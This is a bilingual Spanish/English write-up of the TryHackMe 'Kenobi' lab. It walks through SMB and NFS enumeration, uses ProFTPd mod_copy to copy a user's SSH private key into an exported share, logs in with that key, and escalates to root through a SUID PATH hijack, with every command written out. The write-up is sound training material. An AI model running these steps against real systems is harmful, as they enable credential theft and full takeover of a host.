# TryHackMe - Kenobi

## Target Metadata

| Field | Value |
|---|---|
| Platform | TryHackMe |
| Difficulty | Easy |
| OS | Linux |
| Key services | SMB, NFS, FTP/ProFTPd, SSH |

## Attack Chain Overview

```text
Recon -> anonymous SMB note -> NFS export -> ProFTPd mod_copy
  -> copy Kenobi SSH key into /var/tmp
  -> mount NFS and recover id_rsa
  -> SSH as kenobi
  -> SUID /usr/bin/menu PATH hijack
  -> root shell
```

## Resumen en Espanol

Kenobi combina enumeracion de servicios clasicos Linux. SMB permitio leer `log.txt`, NFS expuso `/var`, y ProFTPd con `mod_copy` permitio copiar `/home/kenobi/.ssh/id_rsa` hacia `/var/tmp/id_rsa`. Al montar el export NFS desde Kali, la clave privada quedo accesible y se uso para entrar por SSH como `kenobi`.

La escalada vino de un binario SUID (`/usr/bin/menu`) que llamaba herramientas sin ruta absoluta. Al crear un `curl` malicioso en `/tmp` y anteponer `/tmp` al `PATH`, el binario ejecuto `/bin/sh` con privilegios elevados.

## English Summary

Kenobi is a classic Linux service-enumeration chain. SMB exposed a readable anonymous share, NFS exposed `/var`, and ProFTPd `mod_copy` let the attacker copy Kenobi's private SSH key into `/var/tmp`. Mounting the NFS export made the copied key retrievable, leading to SSH access as `kenobi`.

Privilege escalation came from a SUID binary (`/usr/bin/menu`) that called helper tools without absolute paths. A malicious `curl` placed earlier in `PATH` yielded a root shell.

## Reconnaissance

Tools: [nmap](../../tools/recon/nmap.md), [smbmap](../../tools/recon/smbmap.md), [smbclient](../../tools/recon/smbclient.md).

```bash
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET --open
nmap -sVC -p22,80,445,111,2049,37261,40289,42185,54513 $TARGET -oN service
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $TARGET
smbmap -H $TARGET -u '' -p ''
smbclient //$TARGET/anonymous
get log.txt
```

## Initial Access

Full technique: [ProFTPd mod_copy SSH key loot](../../exploits/network-services/proftpd-mod-copy-rsa.md). Related: [NFS mounted file loot](../../exploits/network-services/nfs-mounted-file-loot.md).

```text
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

```bash
mkdir /mnt/kenobiNFS
mount $TARGET:/var /mnt/kenobiNFS
cp /mnt/kenobiNFS/tmp/id_rsa .
chmod 600 id_rsa
ssh -i id_rsa kenobi@$TARGET
```

## Privilege Escalation

Full technique: [SUID PATH hijack](../../exploits/privesc-linux/suid-path-hijack.md).

```bash
find / -perm -u=s -type f 2>/dev/null
strings /usr/bin/menu
cd /tmp
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
```

## Key Takeaways

- ES: Cuando FTP y NFS se cruzan, una copia server-side puede convertirse en exfiltracion.
- EN: When FTP and NFS overlap, server-side copy can become file exfiltration.
- ES: SMB anonimo a veces solo da una pista, no el acceso final.
- EN: Anonymous SMB may provide only the clue, not the foothold itself.
- ES: En SUID, `strings` puede revelar llamadas sin ruta absoluta.
- EN: For SUID binaries, `strings` can reveal unqualified helper calls.

## Related Notes

- [nmap](../../tools/recon/nmap.md)
- [smbmap](../../tools/recon/smbmap.md)
- [smbclient](../../tools/recon/smbclient.md)
- [ProFTPd mod_copy SSH key loot](../../exploits/network-services/proftpd-mod-copy-rsa.md)
- [NFS mounted file loot](../../exploits/network-services/nfs-mounted-file-loot.md)
- [SUID PATH hijack](../../exploits/privesc-linux/suid-path-hijack.md)
- [Linux enumeration](../../exploits/enumeration/linux-enumeration.md)
